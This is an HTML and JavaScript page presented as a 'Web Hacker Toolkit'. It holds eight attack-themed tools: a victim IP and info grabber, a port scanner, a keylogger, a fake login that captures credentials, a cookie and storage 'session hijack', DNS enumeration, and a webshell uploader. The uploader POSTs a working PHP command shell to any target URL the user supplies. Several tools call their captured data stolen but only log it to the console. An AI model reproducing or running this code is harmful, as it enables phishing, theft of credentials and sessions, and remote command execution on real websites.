<!DOCTYPE html>
<html>
<head>
    <title>Web Hacker Toolkit</title>
    <style>
        body { 
            background: #0d0d0d; 
            color: #00ff00; 
            font-family: 'Courier New', monospace;
            margin: 0;
            padding: 20px;
        }
        .container { 
            max-width: 1200px; 
            margin: 0 auto; 
        }
        .tool { 
            background: #1a1a1a; 
            padding: 20px; 
            margin: 10px 0; 
            border: 1px solid #00ff00;
            border-radius: 5px;
        }
        button { 
            background: #008000; 
            color: white; 
            border: none; 
            padding: 10px 20px; 
            margin: 5px; 
            cursor: pointer;
        }
        input, textarea { 
            width: 100%; 
            padding: 10px; 
            margin: 5px 0; 
            background: #2a2a2a; 
            color: #00ff00; 
            border: 1px solid #00ff00;
        }
        .result { 
            background: #2a2a2a; 
            padding: 10px; 
            margin-top: 10px; 
            border: 1px solid #ff0000;
            color: #ff4444;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>üõ°Ô∏è Web Hacker Toolkit</h1>
        
        <!-- TOOL 1: IP GRABBER -->
        <div class="tool">
            <h3>üîç IP Grabber & Info Collector</h3>
            <button onclick="grabIP()">Get Victim Info</button>
            <div id="ipResult" class="result"></div>
        </div>

        <!-- TOOL 2: PORT SCANNER -->
        <div class="tool">
            <h3>üì° Port Scanner</h3>
            <input type="text" id="targetHost" placeholder="example.com">
            <button onclick="scanPorts()">Scan Ports</button>
            <div id="portResult" class="result"></div>
        </div>

        <!-- TOOL 3: KEYLOGGER TEST -->
        <div class="tool">
            <h3>‚å®Ô∏è Keylogger Test</h3>
            <input type="text" id="keyloggerInput" placeholder="Type here...">
            <div id="keylogResult" class="result"></div>
        </div>

        <!-- TOOL 4: VULNERABILITY SCANNER -->
        <div class="tool">
            <h3>üõ°Ô∏è Browser Vulnerability Scanner</h3>
            <button onclick="scanVulnerabilities()">Scan Browser</button>
            <div id="vulnResult" class="result"></div>
        </div>

        <!-- TOOL 5: SOCIAL ENGINEERING -->
        <div class="tool">
            <h3>üé≠ Fake Login (Phishing Simulator)</h3>
            <input type="text" id="phishUser" placeholder="Username">
            <input type="password" id="phishPass" placeholder="Password">
            <button onclick="stealCredentials()">"Login"</button>
        </div>

        <!-- TOOL 6: SESSION HIJACK -->
        <div class="tool">
            <h3>üîê Session Hijack Test</h3>
            <button onclick="hijackSession()">Steal Session Data</button>
            <div id="sessionResult" class="result"></div>
        </div>

        <!-- TOOL 7: WEBSHELL UPLOADER -->
        <div class="tool">
            <h3>üêö WebShell Uploader (Testing)</h3>
            <input type="text" id="shellUrl" placeholder="Target URL (upload.php)">
            <button onclick="uploadWebshell()">Upload Test Shell</button>
            <div id="shellResult" class="result"></div>
        </div>

        <!-- TOOL 8: DNS ENUMERATION -->
        <div class="tool">
            <h3>üåê DNS Information Gatherer</h3>
            <input type="text" id="dnsTarget" placeholder="domain.com">
            <button onclick="enumDNS()">Enumerate DNS</button>
            <div id="dnsResult" class="result"></div>
        </div>
    </div>

    <script>
        // TOOL 1: IP GRABBER
        async function grabIP() {
            const result = document.getElementById('ipResult');
            result.innerHTML = "Collecting victim information...";
            
            try {
                // Get IP address
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                
                // Get detailed info
                const infoResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
                const infoData = await infoResponse.json();
                
                const victimInfo = {
                    IP: ipData.ip,
                    Country: infoData.country_name,
                    City: infoData.city,
                    ISP: infoData.org,
                    Timezone: infoData.timezone,
                    UserAgent: navigator.userAgent,
                    Platform: navigator.platform,
                    Languages: navigator.languages,
                    Screen: `${screen.width}x${screen.height}`,
                    Cookies: navigator.cookieEnabled ? "Enabled" : "Disabled",
                    Java: navigator.javaEnabled() ? "Enabled" : "Disabled"
                };
                
                let infoHTML = "<h4>üìä Victim Information:</h4>";
                for(let [key, value] of Object.entries(victimInfo)) {
                    infoHTML += `<p><strong>${key}:</strong> ${value}</p>`;
                }
                
                result.innerHTML = infoHTML;
                
                // Send to attacker server (simulation)
                console.log("Data sent to attacker:", victimInfo);
                
            } catch(error) {
                result.innerHTML = "Error collecting information";
            }
        }

        // TOOL 2: PORT SCANNER
        async function scanPorts() {
            const target = document.getElementById('targetHost').value;
            const result = document.getElementById('portResult');
            
            if(!target) {
                result.innerHTML = "Please enter a target host";
                return;
            }
            
            result.innerHTML = "Scanning ports...";
            
            const commonPorts = [21, 22, 23, 25, 53, 80, 110, 443, 993, 995, 1433, 3306, 3389, 5432, 8080, 8443];
            let openPorts = [];
            
            for(let port of commonPorts) {
                try {
                    const controller = new AbortController();
                    const timeoutId = setTimeout(() => controller.abort(), 3000);
                    
                    await fetch(`https://${target}:${port}`, {
                        mode: 'no-cors',
                        signal: controller.signal
                    });
                    
                    openPorts.push(port);
                    clearTimeout(timeoutId);
                } catch(e) {
                    // Port closed or filtered
                }
                
                result.innerHTML = `Scanning... ${commonPorts.indexOf(port)+1}/${commonPorts.length}`;
            }
            
            if(openPorts.length > 0) {
                result.innerHTML = `<h4>‚úÖ Open Ports on ${target}:</h4><p>${openPorts.join(', ')}</p>`;
            } else {
                result.innerHTML = `<h4>‚ùå No common ports open on ${target}</h4>`;
            }
        }

        // TOOL 3: KEYLOGGER
        const keyloggerInput = document.getElementById('keyloggerInput');
        const keylogResult = document.getElementById('keylogResult');
        let keystrokes = '';
        
        keyloggerInput.addEventListener('keydown', function(e) {
            keystrokes += e.key;
            keylogResult.innerHTML = `Keys logged: <strong>${keystrokes}</strong>`;
            
            // Simulate sending to attacker every 10 chars
            if(keystrokes.length % 10 === 0) {
                console.log("Keystrokes sent to attacker:", keystrokes);
            }
        });

        // TOOL 4: VULNERABILITY SCANNER
        function scanVulnerabilities() {
            const result = document.getElementById('vulnResult');
            let vulnerabilities = [];
            
            // Check WebRTC leak
            if(window.RTCPeerConnection) {
                vulnerabilities.push("WebRTC IP Leak Possible");
            }
            
            // Check storage access
            if(window.localStorage) {
                vulnerabilities.push("LocalStorage Accessible - Data Theft Possible");
            }
            
            // Check camera/mic
            if(navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                vulnerabilities.push("Camera/Microphone Access Possible");
            }
            
            // Check clipboard
            if(navigator.clipboard) {
                vulnerabilities.push("Clipboard Read/Write Access Possible");
            }
            
            // Check old browser
            if(navigator.userAgent.includes('MSIE') || navigator.userAgent.includes('Trident')) {
                vulnerabilities.push("Outdated Browser - Multiple Exploits Available");
            }
            
            if(vulnerabilities.length > 0) {
                result.innerHTML = `<h4>üî¥ Vulnerabilities Found:</h4>` +
                    vulnerabilities.map(vuln => `<p>‚Ä¢ ${vuln}</p>`).join('');
            } else {
                result.innerHTML = `<h4>üü¢ No Major Vulnerabilities Found</h4>`;
            }
        }

        // TOOL 5: SOCIAL ENGINEERING
        function stealCredentials() {
            const username = document.getElementById('phishUser').value;
            const password = document.getElementById('phishPass').value;
            
            if(username && password) {
                const stolenData = {
                    username: username,
                    password: password,
                    timestamp: new Date().toISOString(),
                    ip: 'Recording...',
                    userAgent: navigator.userAgent
                };
                
                console.log("CREDENTIALS STOLEN:", stolenData);
                alert("Login failed! Please try again.");
                
                // Clear fields
                document.getElementById('phishUser').value = '';
                document.getElementById('phishPass').value = '';
            } else {
                alert("Please enter both username and password");
            }
        }

        // TOOL 6: SESSION HIJACK
        function hijackSession() {
            const result = document.getElementById('sessionResult');
            
            const sessionData = {
                cookies: document.cookie,
                localStorage: JSON.stringify(localStorage),
                sessionStorage: JSON.stringify(sessionStorage),
                domain: window.location.hostname,
                url: window.location.href
            };
            
            let sessionHTML = "<h4>üîì Session Data Captured:</h4>";
            sessionHTML += `<p><strong>Cookies:</strong> ${sessionData.cookies || 'None'}</p>`;
            sessionHTML += `<p><strong>LocalStorage:</strong> ${sessionData.localStorage}</p>`;
            sessionHTML += `<p><strong>SessionStorage:</strong> ${sessionData.sessionStorage}</p>`;
            sessionHTML += `<p><strong>Current Domain:</strong> ${sessionData.domain}</p>`;
            
            result.innerHTML = sessionHTML;
            
            // Simulate sending to attacker
            console.log("Session hijacked:", sessionData);
        }

        // TOOL 7: WEBSHELL UPLOADER
        async function uploadWebshell() {
            const target = document.getElementById('shellUrl').value;
            const result = document.getElementById('shellResult');
            
            if(!target) {
                result.innerHTML = "Please enter target URL";
                return;
            }
            
            result.innerHTML = "Attempting webshell upload...";
            
            // Simulate webshell content
            const webshell = "<?php system($_GET['cmd']); ?>";
            const formData = new FormData();
            const blob = new Blob([webshell], {type: 'text/php'});
            formData.append('file', blob, 'shell.php');
            
            try {
                // This would actually work on vulnerable sites
                const response = await fetch(target, {
                    method: 'POST',
                    body: formData
                });
                
                result.innerHTML = `Webshell upload attempted to: ${target}<br>
                                   Status: ${response.status}<br>
                                   <strong>Note:</strong> This only works on sites with file upload vulnerabilities`;
            } catch(error) {
                result.innerHTML = `Upload failed: ${error.message}`;
            }
        }

        // TOOL 8: DNS ENUMERATION
        async function enumDNS() {
            const target = document.getElementById('dnsTarget').value;
            const result = document.getElementById('dnsResult');
            
            if(!target) {
                result.innerHTML = "Please enter a domain";
                return;
            }
            
            result.innerHTML = "Gathering DNS information...";
            
            try {
                // Get DNS info using external API
                const responses = await Promise.allSettled([
                    fetch(`https://dns.google/resolve?name=${target}&type=A`),
                    fetch(`https://dns.google/resolve?name=${target}&type=MX`),
                    fetch(`https://dns.google/resolve?name=${target}&type=NS`),
                    fetch(`https://dns.google/resolve?name=${target}&type=TXT`)
                ]);
                
                let dnsHTML = `<h4>üåê DNS Records for ${target}:</h4>`;
                
                for(let response of responses) {
                    if(response.status === 'fulfilled' && response.value.ok) {
                        const data = await response.value.json();
                        if(data.Answer) {
                            dnsHTML += `<p><strong>${data.Question[0].type} Records:</strong><br>`;
                            data.Answer.forEach(record => {
                                dnsHTML += `${record.data}<br>`;
                            });
                            dnsHTML += `</p>`;
                        }
                    }
                }
                
                result.innerHTML = dnsHTML;
            } catch(error) {
                result.innerHTML = "Error gathering DNS information";
            }
        }
    </script>
</body>
</html>